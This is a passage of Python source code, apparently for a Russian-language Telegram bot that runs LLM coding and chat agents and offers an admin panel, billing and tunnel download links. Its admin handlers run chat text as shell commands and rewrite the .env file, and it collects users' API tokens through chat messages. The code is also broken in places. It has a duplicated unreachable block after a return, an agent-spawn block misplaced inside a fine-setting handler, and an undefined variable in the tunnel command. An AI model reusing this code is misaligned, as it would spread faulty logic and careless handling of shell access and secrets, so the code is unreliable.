        rows = [btns[i:i+2] for i in range(0, len(btns), 2)]
        rows.append([btn("◀️ Назад", "menu_llm")])
        markup = kb(*rows)
    send_message(report, chat_id, reply_markup=markup)


def task_test(chat_id):
    send_message(
        "🧪 Тестирую LLM...\n"
        "Провайдер: <b>{}</b>\n"
        "Модель: <b>{}</b>".format(config.LLM_PROVIDER, config.LLM_MODEL),
        chat_id)
    ok, msg = test_connection()
    send_message("{} Результат:\n{}".format('✅' if ok else '❌', msg[:400]), chat_id)

def task_voices(chat_id):
    provider = (config.TTS_PROVIDER or 'edge').lower().strip()
    send_message("🎙 Загружаю список голосов (provider={})...".format(provider), chat_id)
    try:
        if provider in ('eleven', 'elevenlabs', '11labs'):
            voices = eleven_list_voices()
            lines = ["• {} — <code>{}</code>".format(v['name'], v['voice_id']) for v in voices[:25]]
            send_message("🎙 <b>Голоса ElevenLabs:</b>\n\n" + "\n".join(lines), chat_id)
        else:
            import asyncio
            import edge_tts as _etts
            all_v = asyncio.run(_etts.list_voices())
            lang_key = os.environ.get('TTS_LANGUAGE', 'ru').lower()
            lang_voices = [v for v in all_v if v.get('Locale', '').lower().startswith(lang_key)][:25]
            lines = ["• <code>{}</code>".format(v['ShortName']) for v in lang_voices]
            send_message(
                "🎙 <b>Голоса edge-tts ({}):</b>\n\n".format(lang_key.upper()) +
                "\n".join(lines) +
                "\n\n<i>Скопируй ShortName → 🎙 Сменить голос</i>",
                chat_id)
    except Exception as e:
        send_message("❌ Ошибка: {}".format(e), chat_id)


# ══════════════════════════════════════════════════════════════
#  ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ
# ══════════════════════════════════════════════════════════════

def _run_code_pipeline(chat_id, sess):
    """Запускает pipeline агент-кодера. После завершения сессия остаётся активной."""
    send_message(
        f"🚀 <b>Запускаю!</b>\n"
        f"Задача: <i>{sess.task[:80]}</i>\n"
        f"Файлов: {len(sess.files)}",
        chat_id
    )
    def _run(_sess=sess):
        _gs.task_start(chat_id)
        try:
            try: from agent_core import _llm_call as llm_fn
            except Exception: llm_fn = None
            from agent_session import execute_pipeline, close_session
            sm = make_status(chat_id, send_message, edit_message)
            result = execute_pipeline(_sess, on_status=sm.make_on_status(), llm_caller=llm_fn)
            sm.done(f"{'✅' if result.get('ok') else '⚠️'} Готово")
        except Exception as exc:
            send_message(f"❌ {exc}", chat_id)
            result = {'artifacts':[], 'errors':[str(exc)], 'ok':False, 'zip_path':None}
        finally:
            _gs.task_done(chat_id)
        # Отправляем артефакты
        for art in result.get('artifacts', []):
            if os.path.exists(art.get('path','')):
                try: send_document(art['path'], caption=f"📎 {art['name']}", chat_id=chat_id)
                except Exception: pass
        if result.get('zip_path') and os.path.exists(result['zip_path']):
            try: send_document(result['zip_path'], caption="📦 Все результаты", chat_id=chat_id)
            except Exception: pass
        # Закрываем agent_session (не wait_state!)
        from agent_session import close_session
        close_session(chat_id)
        # Сессия code_session остаётся — ждём следующую задачу
        _wait_state[chat_id] = 'code_session'
        errs = result.get('errors', [])
        send_message(
            f"{'✅' if result.get('ok') else '⚠️'} <b>Готово</b>"
            + (f" · {len(result.get('artifacts',[]))} файлов" if result.get('artifacts') else "")
            + (f" · ⚠️ {len(errs)} ошибок" if errs else "")
            + "\n\n💬 <i>Пиши следующую задачу или нажми стоп</i>",
            chat_id,
            reply_markup=kb([btn("🔴 Стоп", "agent_stop_code")])
        )
    _run_in_thread(_run)


def _handle_agent_message(chat_id, text, mode):
    """Обрабатывает сообщение внутри активной ИИ-сессии."""
    # ── Billing gate ──────────────────────────────────────────────────────
    bm = BillingManager(chat_id)
    ok, err = bm.can_run_task()
    if not ok:
        send_message(err, chat_id, reply_markup=kb(
            [btn("💳 Тарифы и кредиты", "billing:status")],
            [btn("◀️ Меню", "menu")],
        ))
        return
    try:
        user_role = get_role(chat_id) if ROLES_ENABLED else 'user'
        user_plan = 'free'
        try:
            from agent_memory import AgentMemory
            s = AgentMemory(chat_id).user.recall('plan')
            if s: user_plan = s
        except Exception:
            pass
    except Exception:
        user_role, user_plan = 'user', 'free'

    # ── Режим code — АГЕНТ-КОДЕР (изолирован, только code_agent_run) ─────
    if mode == 'code':
        # Стоп
        if text.strip().lower() in ('стоп','stop','/end','/стоп','отмена','cancel'):
            _wait_state.pop(chat_id, None)
            try:
                from agent_session import close_session; close_session(chat_id)
            except Exception: pass
            send_message("🔴 Сессия агент-кодера завершена.", chat_id,
                         reply_markup=menu_keyboard(chat_id))
            return

        # Ждём токен
        tok = _wait_state.get(chat_id, '')
        if tok.startswith('code_token:'):
            env_key = tok.split(':',1)[1]
            os.environ[env_key] = text.strip()
            task = _pending_agent_task.pop(chat_id, {}).get('task','')
            _wait_state[chat_id] = 'code_session'
            send_message("🔑 Токен принят, запускаю...", chat_id)
            if task: _run_in_thread(_run_code_task, chat_id, task)
            return

        # Если есть накопленные файлы и сказали "готово" — pipeline с файлами
        from agent_session import is_ready_trigger, get_session
        if is_ready_trigger(text):
            sess = get_session(chat_id)
            if sess and sess.files:
                _run_code_pipeline(chat_id, sess)
            else:
                send_message("📝 Напиши задачу.", chat_id,
                             reply_markup=kb([btn("🔴 Стоп","agent_stop_code")]))
                _wait_state[chat_id] = 'code_session'
            return

        # Нужен ли токен?
        tl = text.lower()
        for kw,(env_k,lbl) in [
            ('telegram bot',('BOT_TOKEN','токен Telegram бота (@BotFather)')),
            ('telegram',    ('BOT_TOKEN','токен Telegram бота (@BotFather)')),
            ('openai',      ('OPENAI_API_KEY','OpenAI API key')),
            ('gemini',      ('GEMINI_API_KEY','Gemini API key')),
            ('discord',     ('DISCORD_TOKEN','Discord bot token')),
            ('stripe',      ('STRIPE_KEY','Stripe API key')),
            ('github',      ('GITHUB_TOKEN','GitHub Personal Access Token')),
        ]:
            if kw in tl and not os.environ.get(env_k):
                _pending_agent_task[chat_id] = {'task': text}
                _wait_state[chat_id] = f'code_token:{env_k}'
                send_message(
                    f"🔑 <b>Нужен токен</b>\n\nЗадача требует <b>{lbl}</b>.\n"
                    f"Отправь токен следующим сообщением:",
                    chat_id,
                    reply_markup=kb([btn("⏭ Пропустить","_agent_go"),
                                     btn("🔴 Стоп","agent_stop_code")])
                )
                return

        # Запускаем сразу — как раньше, через code_agent_run
        _wait_state[chat_id] = 'code_session'
        _run_in_thread(_run_code_task, chat_id, text)
        return

    # ── Режим smith — АГЕНТ_СМИТ (agent_session pipeline) ────────────────
    if mode == 'smith':
        from agent_session import (get_session, is_ready_trigger,
                                    is_cancel_trigger)
        if is_cancel_trigger(text) or text.strip().lower() in ('стоп','stop'):
            from agent_session import close_session; close_session(chat_id)
            _wait_state.pop(chat_id, None)
            send_message("❌ Задача СМИТА отменена.", chat_id,
                         reply_markup=menu_keyboard(chat_id))
            return
        if is_ready_trigger(text):
            sess = get_session(chat_id)
            if sess and sess.task: _run_code_pipeline(chat_id, sess)
            return
        sess = get_session(chat_id)
        if sess:
            sess.task = (sess.task or '') + '\n' + text
            send_message("📝 Добавлено. Напиши <b>готово</b> для запуска.",
                         chat_id, reply_markup=kb([btn("🚀 Готово","_agent_go"),
                                                    btn("❌ Отмена","adm:close_agent")]))
        return

    # ── Режим chat — используем agent_core pipeline ───────────────────────
    def _do_agent():
        if AGENT_CORE_ENABLED:
            # Показываем статус в реальном времени
            status_msgs = []
            last_status_id = [None]

            def on_status(msg):
                status_msgs.append(msg)
                try:
                    if last_status_id[0]:
                        edit_message(chat_id, last_status_id[0], msg)
                    else:
                        r = send_message(f"⏳ {msg}", chat_id)
                        if isinstance(r, dict) and 'result' in r:
                            last_status_id[0] = r['result'].get('message_id')
                except Exception:
                    pass

            result = _agent_core.run(
                task=text,
                chat_id=chat_id,
                user_id=chat_id,
                mode='auto',
                on_status=on_status,
            )

            # Удаляем статус-сообщение
            if last_status_id[0]:
                try:
                    from telegram_client import delete_message
                    delete_message(chat_id, last_status_id[0])
                except Exception:
                    pass

            # Отправляем результат
            final_text = _agent_core.status_text(result)
            final_text = _strip_think(final_text)
            send_message(final_text, chat_id, reply_markup=chat_control_keyboard())

            # Отправляем артефакты
            artifacts = result.get('artifacts', [])
            if artifacts:
                from telegram_client import send_document
                send_message(f"📎 Отправляю {len(artifacts)} файлов...", chat_id)
                for path in artifacts[:10]:
                    import os as _os
                    if _os.path.exists(path):
                        send_document(path, caption=f"📎 {_os.path.basename(path)}", chat_id=chat_id)

            # Показываем шаги если их несколько
            steps = result.get('steps', [])
            if steps and len(steps) > 1:
                icons = {True: "✅", False: "❌"}
                summary = "📊 <b>Шаги:</b>\n" + "\n".join(
                    f"{icons[s.get('ok',True)]} {s.get('tool','?')}: {str(s.get('result',''))[:60]}"
                    for s in steps
                )
                send_message(summary, chat_id)

        else:
            # Fallback: старый путь
            try:
                tool_keywords = [
                    'озвучь','произнеси','tts','собери видео','создай видео',
                    'найди в интернете','поищи','скачай страницу','установи пакет',
                    'создай бота','запусти','выполни код','напиши модуль',
                ]
                use_tools = TOOLS_ENABLED and any(kw in text.lower() for kw in tool_keywords)
                if use_tools:
                    send_message("🔧 Агент с инструментами...", chat_id)
                    final, results = run_agent_with_tools(
                        chat_id, text,
                        on_status=lambda m: send_message(m, chat_id),
                    )
                    if final:
                        send_message(_strip_think(final)[:3500], chat_id,
                                     reply_markup=chat_control_keyboard())
                else:
                    from chat_agent import chat_respond
                    reply = _strip_think(chat_respond(chat_id, text))
                    send_message(reply[:4000], chat_id, reply_markup=chat_control_keyboard())
            except Exception as e:
                send_message(f"❌ Ошибка: {e}", chat_id)

    _run_in_thread(_do_agent)


def _run_code_task(chat_id, text, proj_mode=None):
    """Запускает агент-кодер, отправляет вывод по частям, собирает zip."""

    def on_status(msg):
        send_message(msg, chat_id)

    result = code_agent_run(chat_id, text, on_status=on_status, proj_mode=proj_mode)
    formatted = format_code_result(result)

    # Шапка с кодом (может быть длинной — режем на 4096)
    _send_chunked(chat_id, formatted)

    # Полный вывод скрипта
    full_output = result.get('_full_output', '')

    if full_output and full_output != '(нет вывода)':
        import re as _re

        # Убираем ANSI escape коды (цвета, курсор)
        ansi_clean = _re.sub(r'\x1b\[[0-9;]*[mABCDEFGHJKSThlsu]', '', full_output)
        ansi_clean = _re.sub(r'\x1b\[[\d;]*[A-Za-z]', '', ansi_clean)

        # Определяем: это консольная анимация?
        is_animation = (
            '\x1b[' in full_output or          # ANSI escape codes
            '[25A' in full_output or            # cursor-up (анимация)
            len(full_output.splitlines()) > 50 or  # много строк
            len(full_output) > 8000            # большой вывод
        )

        if is_animation:
            # Отправляем только последние N строк (финальный кадр) и информацию
            clean_lines = [l for l in ansi_clean.splitlines() if l.strip()]
            total_lines = len(clean_lines)
            preview_lines = clean_lines[-20:] if len(clean_lines) > 20 else clean_lines
            preview = '\n'.join(preview_lines)

            send_message(
                f"🖥 <b>Вывод программы</b> ({total_lines} строк):\n"
                f"<i>Показан финальный фрагмент:</i>\n\n"
                f"<pre>{_esc(preview[:2000])}</pre>",
                chat_id
            )
        else:
            # Обычный вывод — отправляем по частям
            label = "Результат:" if result.get('success') else "Ошибка:"
            header = "<b>{}:</b>\n<pre>".format(label)
            footer = "</pre>"
            chunk_size = 4000 - len(header) - len(footer)

            lines = ansi_clean.splitlines(keepends=True)
            current = ""
            part = 1
            total_parts = max(1, (len(ansi_clean) + chunk_size - 1) // chunk_size)

            for line in lines:
                if len(current) + len(line) > chunk_size:
                    chunk_text = header + _esc(current.rstrip()) + footer
                    if total_parts > 1:
                        chunk_text += " <i>({}/{})</i>".format(part, total_parts)
                    send_message(chunk_text, chat_id)
                    current = line
                    part += 1
                else:
                    current += line

            if current.strip():
                chunk_text = header + _esc(current.rstrip()) + footer
                if total_parts > 1:
                    chunk_text += " <i>({}/{})</i>".format(part, total_parts)
                send_message(chunk_text, chat_id)

    # Файлы созданные агентом
    files = result.get('files', [])
    task_type = result.get('_task_type', '')

    # ── Специальная обработка для video-агента ──────────────────────
    if task_type == 'video':
        if full_output:
            send_message(full_output, chat_id)

        if files:
            fpath = files[0]
            if os.path.exists(fpath):
                fsize_mb = result.get('_fsize_mb', 0)
                fmt      = result.get('_video_fmt', 'mp4')
                title    = result.get('_video_title', os.path.basename(fpath))
                icon     = '🎵' if fmt == 'mp3' else '🎬'
                caption  = "{} {} ({:.1f} MB)".format(icon, title, fsize_mb)

                tg_limit = 49
                if fsize_mb <= tg_limit:
                    send_message("📤 Отправляю файл...", chat_id)
                    try:
                        send_document(fpath, caption=caption, chat_id=chat_id)
                    except Exception as e:
                        send_message("⚠️ Не удалось отправить через Telegram: {}\n"
                                     "Попробуй скачать по туннельной ссылке.".format(e), chat_id)
                else:
                    send_message(
                        "⚠️ Файл {:.1f} MB — слишком большой для Telegram API (лимит ~50 MB).\n"
                        "Файл сохранён локально: <code>{}</code>".format(
                            fsize_mb, os.path.basename(fpath)), chat_id)

                try:
                    import fish_bot_state as _fbs
                    tunnel_url = (_fbs.tunnel_url or _fbs.bore_url or
                                  _fbs.ngrok_url or _fbs.serveo_url)
                    if tunnel_url:
                        send_message(
                            "🌍 Также доступен через туннель:\n"
                            "<code>{}/download/{}</code>".format(
                                tunnel_url.rstrip('/'),
                                os.path.basename(fpath)), chat_id)
                except Exception:
                    pass
            else:
                send_message("❌ Файл не найден на диске.", chat_id)

        send_message("✅ <b>Готово.</b> Сессия активна — пиши следующую задачу.",
                     chat_id, reply_markup=chat_control_keyboard())
        return
        # Сводка уже в _full_output — показываем её
        if full_output:
            send_message(full_output, chat_id)

        # Отправляем каждый файл
        if files:
            send_message("📎 <b>Отправляю файлы ({} шт.)...</b>".format(len(files)), chat_id)
            for fpath in files:
                if os.path.exists(fpath) and os.path.isfile(fpath):
                    try:
                        ext = os.path.splitext(fpath)[1].lower()
                        icons = {'.txt':'📄','.md':'📝','.csv':'📊',
                                 '.docx':'📃','.zip':'📦','.rar':'📦'}
                        icon = icons.get(ext, '📎')
                        caption = "{} {}".format(icon, os.path.basename(fpath))
                        send_document(fpath, caption=caption, chat_id=chat_id)
                    except Exception as e:
                        send_message("⚠️ Не удалось отправить {}: {}".format(
                            os.path.basename(fpath), e), chat_id)

        # Туннельная ссылка — если файлы доступны через веб-сервер
        try:
            import fish_bot_state as _fbs
            tunnel_url = _fbs.tunnel_url or _fbs.bore_url or _fbs.ngrok_url or _fbs.serveo_url
            if tunnel_url:
                send_message(
                    "🌍 Файлы также доступны через туннель:\n"
                    "<code>{}</code>".format(tunnel_url),
                    chat_id)
        except Exception:
            pass

        send_message("✅ <b>Готово.</b> Сессия активна — пиши следующую задачу.", chat_id, reply_markup=chat_control_keyboard())
        return

    # ── Стандартная обработка (скрипты, проекты) ──────────────────
    all_items = list(files)
    zip_to_send = None

    if files or full_output:
        import zipfile as _zf, time as _time
        ts = _time.strftime('%H%M%S')
        zip_dir = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), 'agent_projects', 'results'
        )
        os.makedirs(zip_dir, exist_ok=True)
        zip_path = os.path.join(zip_dir, 'result_{}.zip'.format(ts))

        with _zf.ZipFile(zip_path, 'w', _zf.ZIP_DEFLATED) as zf:
            code = result.get('code', '')
            if code:
                zf.writestr('script.py', code)
            if full_output:
                zf.writestr('output.txt', full_output)
            for fpath in files:
                if os.path.exists(fpath):
                    zf.write(fpath, os.path.basename(fpath))
        zip_to_send = zip_path

    if files:
        send_message("📎 <b>Отправляю файлы ({} шт.)...</b>".format(len(files)), chat_id)
    try:
        if files:
            for fpath in files:
                if os.path.exists(fpath) and os.path.isfile(fpath):
                    try:
                        send_document(fpath, caption="📄 {}".format(os.path.basename(fpath)), chat_id=chat_id)
                    except Exception as e:
                        send_message("⚠️ {}".format(e), chat_id)

        if zip_to_send and os.path.exists(zip_to_send):
            send_message("📦 <b>Итоговый архив (код + вывод + файлы):</b>", chat_id)
            send_document(zip_to_send, caption="📦 result.zip", chat_id=chat_id)

    except Exception as _e:
        send_message(f"⚠️ Ошибка при отправке файлов: {_e}", chat_id)
        for _f in files:
            try:
                if os.path.exists(_f):
                    send_document(_f, caption=os.path.basename(_f), chat_id=chat_id)
            except Exception:
                pass

    # Оставляем code_session активным — юзер пишет следующую задачу
    _wait_state[chat_id] = 'code_session'
    send_message(
        "✅ <b>Задача выполнена.</b>\n"
        "<i>Пиши следующую задачу или нажми стоп.</i>",
        chat_id,
        reply_markup=kb(
            [btn("📎 + Файлы к задаче",   "coder:files_hint")],
            [btn("🔴 Завершить сессию",    "agent_stop_code")],
        )
    )


def _send_chunked(chat_id, text, chunk_size=4096):
    """Отправляет длинный текст по частям."""
    if not text.strip():
        return
    for i in range(0, len(text), chunk_size):
        send_message(text[i:i+chunk_size], chat_id)


def _esc(text):
    import html
    return html.escape(str(text))


def _show_quick_provider(chat_id):
    """Быстрая смена провайдера — показывает кнопки топ-провайдеров."""
    from llm_checker import RECOMMENDED

    # Популярные провайдеры с рекомендуемыми моделями
    QUICK = [
        ('mistral',   'mistral-small-latest',          'Mistral Small'),
        ('groq',      'llama-3.3-70b-versatile',       'Groq Llama-3.3'),
        ('deepseek',  'deepseek-chat',                 'DeepSeek V3'),
        ('openrouter','deepseek/deepseek-chat:free',   'OpenRouter Free'),
        ('gemini',    'gemini-2.0-flash',              'Gemini Flash'),
        ('openai',    'gpt-4o-mini',                   'GPT-4o Mini'),
        ('cerebras',  'llama-3.3-70b',                 'Cerebras Fast'),
        ('ollama',    'llama3.2',                      'Ollama Local'),
    ]

    rows = []
    for provider, model, label in QUICK:
        active = "✅ " if config.LLM_PROVIDER == provider else ""
        rows.append([btn("{}{}".format(active, label), "quickllm:{}:{}".format(provider, model))])

    rows.append([btn("🔍 Все провайдеры", "llm_check"), btn("🔄 Обновить", "llm_discover")])
    rows.append([btn("✏️ Вручную /setllm", "noop")])

    send_message(
        "🧠 <b>Смена провайдера</b>\n"
        "Текущий: <b>{} / {}</b>\n\n"
        "Быстрый выбор (ключи берутся из .env автоматически):".format(
            config.LLM_PROVIDER, config.LLM_MODEL),
        chat_id, reply_markup=kb(*rows)
    )


def handle_text(text, chat_id, username=None, first_name=None):
    # ══ ГЛОБАЛЬНЫЙ ГЕЙТ АВТОРИЗАЦИИ ══════════════════════════════════════
    # Сначала всегда обрабатываем капчу/регистрацию/вход
    try:
        step, _ = auth_state_get(chat_id)
    except Exception:
        step = 'idle'

    if step != 'idle':
        try:
            auth_handle_text(chat_id, text.strip())
        except Exception as e:
            import traceback
            err_full = traceback.format_exc()
            print(f"[AUTH] ERROR in auth_handle_text: {type(e).__name__}: {e}\n{err_full}", flush=True)
            # Если ошибка БД — пробуем мигрировать и повторить
            if 'no such column' in str(e):
                try:
                    from auth_module import init_auth_db
                    init_auth_db()
                    auth_handle_text(chat_id, text.strip())
                    return
                except Exception as e2:
                    print(f"[AUTH] Retry after migration failed: {e2}", flush=True)
            send_message(
                f"⚠️ Ошибка: {type(e).__name__}: {e}\n\nПопробуй ещё раз или /start",
                chat_id)
            return
        try:
            step2, _ = auth_state_get(chat_id)
        except Exception:
            step2 = 'idle'
        if step2 == 'idle' and is_authenticated(chat_id):
            send_message(_current_status_text(chat_id), chat_id, reply_markup=menu_keyboard(chat_id))
        return

    # Если не авторизован — запускаем авторизацию с данными профиля
    if not is_authenticated(chat_id):
        auth_start(chat_id, username=username, first_name=first_name)
        return
    # ══ КОНЕЦ ГЕЙТА ══════════════════════════════════════════════════════
    # ── Admin ожидания ─────────────────────────────────────────────────────
    if ADMIN_ENABLED and is_admin(chat_id):
        adm_state = adm_wait_get(chat_id)
        if adm_state:
            adm_action = adm_state.get('action','')
            adm_data   = adm_state.get('data',{})
            adm_wait_clear(chat_id)
            log_admin_cmd(chat_id, f"{adm_action}: {text[:40]}")

            if adm_action == 'adm_msg_target':
                adm_wait_set(chat_id, 'adm_msg_text', {'target': text.strip()})
                send_message(f"✏️ Введи текст сообщения для <code>{text.strip()}</code>:", chat_id)

            elif adm_action == 'adm_msg_text':
                target = adm_data.get('target','')
                ok2, err2 = send_to_user(target, text.strip())
                send_message(f"{'✅ Отправлено' if ok2 else '❌ Ошибка: ' + str(err2)} → <code>{target}</code>",
                             chat_id, reply_markup=kb([btn("◀️ Адм. меню","admin")]))

            elif adm_action == 'adm_broadcast':
                all_u = get_all_users()
                targets = [str(u['telegram_id']) for u in all_u if u.get('status')=='active' and u.get('login')]
                msg_text = text.strip()
                send_message(f"📣 Рассылаю {len(targets)} пользователям...", chat_id)
                sent_c, fail_c = 0, 0
                for t in targets:
                    ok2, _ = send_to_user(t, msg_text)
                    if ok2: sent_c += 1
                    else:   fail_c += 1
                    time.sleep(0.05)
                send_message(f"✅ Рассылка завершена!\nОтправлено: {sent_c} | Ошибок: {fail_c}",
                             chat_id, reply_markup=kb([btn("◀️ Адм. меню","admin")]))

            elif adm_action == 'adm_notify':
                all_u = get_all_users()
                targets = [str(u['telegram_id']) for u in all_u if u.get('status')=='active' and u.get('login')]
                notify_text = text.strip()
                for t in targets:
                    send_to_user(t, f"🔔 <b>Уведомление:</b>\n{notify_text}")
                    time.sleep(0.05)
                send_message(f"✅ Уведомление отправлено {len(targets)} юзерам.", chat_id,
                             reply_markup=kb([btn("◀️ Адм. меню","admin")]))

            elif adm_action == 'adm_kill_pid':
                ok2, msg2 = kill_process(text.strip())
                send_message(msg2, chat_id, reply_markup=kb([btn("◀️ Адм. меню","admin")]))

            elif adm_action == 'adm_exec_cmd':
                send_message(f"💻 Выполняю: <code>{text.strip()[:100]}</code>", chat_id)
                ok2, out = exec_shell(text.strip())
                icon = "✅" if ok2 else "❌"
                send_message(f"{icon} Вывод:\n<pre>{out[:3000]}</pre>", chat_id,
                             reply_markup=kb([btn("◀️ Адм. меню","admin")]))

            elif adm_action == 'adm_find_user':
                q = text.strip().lstrip('@')
                all_u = get_all_users()
                found = [u for u in all_u
                         if str(u.get('telegram_id','')) == q
                         or (u.get('login','') or '').lower() == q.lower()
                         or (u.get('username','') or '').lower() == q.lower()]
                if not found:
                    send_message(f"❌ Пользователь не найден: {q}", chat_id,
                                 reply_markup=kb([btn("◀️ Адм. меню","admin")]))
                else:
                    for u in found[:3]:
                        send_message(format_profile(u['telegram_id']), chat_id,
                                     reply_markup=user_manage_keyboard(str(u['telegram_id'])))

            elif adm_action == 'adm_add_rating':
                parts2 = text.strip().split()
                if len(parts2) >= 2:
                    try:
                        tid, pts = int(parts2[0]), int(parts2[1])
                        add_rating(tid, pts)
                        send_message(f"⭐ +{pts} рейтинга пользователю <code>{tid}</code>", chat_id,
                                     reply_markup=kb([btn("◀️ Адм. меню","admin")]))
                    except ValueError:
                        send_message("❌ Формат: <code>chat_id очки</code>", chat_id)
                else:
                    send_message("❌ Нужно: <code>chat_id очки</code>", chat_id)

            elif adm_action == 'adm_edit_env':
                # GOD редактирует .env
                from admin_module import is_god
                if not is_god(chat_id):
                    send_message("⚡ Только GOD", chat_id); return
                line = text.strip()
                if '=' not in line:
                    send_message("❌ Формат: <code>КЛЮЧ=значение</code>", chat_id); return
                key, val = line.split('=', 1)
                key = key.strip(); val = val.strip()
                # Применяем в runtime
                os.environ[key] = val
                # Пишем в .env файл
                env_path = os.path.join(config.BASE_DIR, '.env')
                try:
                    lines_env = open(env_path).read().splitlines() if os.path.exists(env_path) else []
                    updated = False
                    for i, l in enumerate(lines_env):
                        if l.startswith(key + '='):
                            lines_env[i] = f"{key}={val}"
                            updated = True; break
                    if not updated:
                        lines_env.append(f"{key}={val}")
                    open(env_path, 'w').write('\n'.join(lines_env))
                    send_message(f"✅ <code>{key}</code> обновлён в .env\n(без перезапуска)", chat_id,
                                 reply_markup=kb([btn("⚙️ Ещё изменить","adm:edit_env"),
                                                  btn("◀️ Адм. меню","admin")]))
                except Exception as e:
                    send_message(f"⚠️ Runtime ок, файл .env: {e}", chat_id)

            elif adm_action == 'adm_set_fine':
                from admin_module import is_god
                if not is_god(chat_id): return
                try:
                    amount = int(text.strip())
                    os.environ['BAN_FINE_AMOUNT'] = str(amount)
                    env_path = os.path.join(config.BASE_DIR, '.env')
                    if os.path.exists(env_path):
                        lines_env = open(env_path).read().splitlines()
                        found = False
                        for i, l in enumerate(lines_env):
                            if l.startswith('BAN_FINE_AMOUNT='):
                                lines_env[i] = f"BAN_FINE_AMOUNT={amount}"; found = True; break
                        if not found: lines_env.append(f"BAN_FINE_AMOUNT={amount}")
                        open(env_path, 'w').write('\n'.join(lines_env))
                    send_message(f"💰 Штраф за бан установлен: <b>{amount}</b> кредитов", chat_id,
                                 reply_markup=kb([btn("◀️ GOD панель","adm:god_panel")]))
                except ValueError:
                    send_message("❌ Введи число", chat_id)
                if TOOLS_ENABLED:
                    send_message(f"🚀 Агент запущен!\nЗадача: <i>{text[:80]}</i>", chat_id)
                    def _do_spawn(_task=text.strip()):
                        final, results = run_agent_with_tools(
                            chat_id, _task,
                            on_status=lambda m: send_message(m, chat_id),
                        )
                        if results:
                            lines2 = [f"{'✅' if r['ok'] else '❌'} {r['tool']}: {r['result'][:120]}"
                                      for r in results]
                            send_message("📊 <b>Итог:</b>\n" + "\n".join(lines2), chat_id)
                        send_message(final[:3500] if final else "✅ Готово", chat_id,
                                     reply_markup=kb([btn("◀️ Адм. меню","admin")]))
                    _run_in_thread(_do_spawn)
                else:
                    send_message("❌ Инструменты не загружены.", chat_id)
            return
    # Далее идёт обычная обработка команд...
    stripped = text.strip()
    if not stripped:
        return
    cmd = stripped.split()[0].lower()

    # ── Wait-state: ВСЕГДА проверяем первым — persistent сессии живут пока не стоп ──
    PERSISTENT_STATES = {'code_session', 'adm_agent_task', 'adm_sc_input', 'neo_task', 'matrix_task', 'rc_shell', 'rc_pty', 'morpheus_task', 'morpheus_task:shell', 'morpheus_task:apt', 'morpheus_task:docker', 'morpheus_task:repo', 'morpheus_task:auto'}
    if chat_id in _wait_state:
        state = _wait_state[chat_id]
        # coder_input:* и code_token:* — не persistent, убираем после обработки
        if state not in PERSISTENT_STATES and not state.startswith('code_token:'):
            _wait_state.pop(chat_id)
        _handle_input(state, stripped, chat_id)
        return

    # Если активна ИИ chat/code сессия — уходит в агент (только после wait_state)
    if is_active(chat_id) and cmd not in ('/endchat', '/end', '/menu', '/start', '/help', '/provider', '/llm', '/модель'):
        sess = get_session(chat_id)
        mode = sess['mode'] if sess and isinstance(sess, dict) else 'chat'
        _handle_agent_message(chat_id, stripped, mode)
        return

    if cmd in ('/start', '/menu', '/help'):
        update_last_seen(chat_id)
        add_rating(chat_id, 1)
        send_message(_current_status_text(chat_id), chat_id, reply_markup=menu_keyboard(chat_id))
    elif cmd in ('/qr', '/tunnel', '/туннель'):
        if CFQR_ENABLED and is_admin(chat_id):
            port = int(cmd_args[0]) if cmd_args else int(os.environ.get('TUNNEL_TARGET_PORT', 80))
            _run_in_thread(lambda: handle_qr_command(chat_id, port))
        elif not is_admin(chat_id):
            send_message("🚫 Только для администраторов", chat_id)
        else:
            send_message("❌ cloudflare_qr_bot не загружен", chat_id)
        bm = BillingManager(chat_id)
        send_message(bm.format_status(), chat_id,
                     reply_markup=bm.billing_keyboard() or kb([btn("◀️ Меню","menu")]))
        _show_profile(chat_id)

    elif cmd in ('/admin', '/адм'):
        if not ADMIN_ENABLED:
            send_message("❌ Модуль администратора не загружен.", chat_id); return
        if not is_admin(chat_id):
            send_message("🚫 Нет доступа.", chat_id); return
        log_admin_cmd(chat_id, cmd)
        send_message("🔑 <b>Панель администратора</b>", chat_id,
                     reply_markup=admin_main_keyboard())

    elif cmd in ('/tools', '/инструменты'):
        if TOOLS_ENABLED:
            send_message(f"🔧 <b>Инструменты агента</b>\n\n<code>{get_tools_list()}</code>",
                         chat_id, reply_markup=kb([btn("◀️ Меню","menu")]))
        else:
            send_message("❌ Реестр инструментов не загружен.", chat_id)
    elif cmd == '/run':
        _guard_lock(chat_id) or _run_in_thread(task_run, chat_id)
    elif cmd == '/parse':
        _guard_lock(chat_id) or _run_in_thread(task_parse, chat_id)
    elif cmd == '/process':
        _guard_lock(chat_id) or _run_in_thread(task_process, chat_id)
    elif cmd == '/test':
        _run_in_thread(task_test, chat_id)
    elif cmd == '/voices':
        _run_in_thread(task_voices, chat_id)
    elif cmd == '/stats':
        send_message(_current_status_text(chat_id), chat_id, reply_markup=menu_keyboard(chat_id))
    elif cmd == '/env':
        _show_env(chat_id)
    elif cmd.startswith('/setprompt'):
        parts = text.strip().split(maxsplit=1)
        if len(parts) < 2:
            _wait_state[chat_id] = 'custom_prompt'
            send_message("✏️ Введи новый системный промт:", chat_id)
        else:
            _apply_custom_prompt(parts[1], chat_id)
    elif cmd.startswith('/llm'):
        # /llm — быстрая смена провайдера интерактивно
        parts = text.split()
        if len(parts) == 1:
            # Показываем текущий + меню
            cur_p = config.LLM_PROVIDER
            cur_m = config.LLM_MODEL
            providers = list(RECOMMENDED.keys())
            rows = []
            for i in range(0, len(providers), 3):
                row = [btn(('✅ ' if providers[j] == cur_p else '') + providers[j],
                           'llm_pick:{}'.format(providers[j]))
                       for j in range(i, min(i+3, len(providers)))]
                rows.append(row)
            rows.append([back_btn("menu_llm")])
            send_message(
                'Текущий: <b>{}</b> / <code>{}</code>\n\nВыбери провайдера:'.format(cur_p, cur_m),
                chat_id, reply_markup=kb(*rows)
            )
        elif len(parts) >= 2:
            # /llm groq  или  /llm groq llama-3.3-70b  или  /llm groq model key
            provider = parts[1].lower()
            rec = RECOMMENDED.get(provider, [])
            model = parts[2] if len(parts) >= 3 else (rec[0] if rec else config.LLM_MODEL)
            api_key = parts[3] if len(parts) >= 4 else ''
            config.set_llm(provider, model, api_key)
            send_message(
                '✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>'.format(provider, model),
                chat_id)

    elif cmd == '/fix':
        _wait_state[chat_id] = 'fix_input'
        send_message(
            "🔧 <b>Исправление ошибок</b>\n\nОтправь код + текст ошибки.\n"
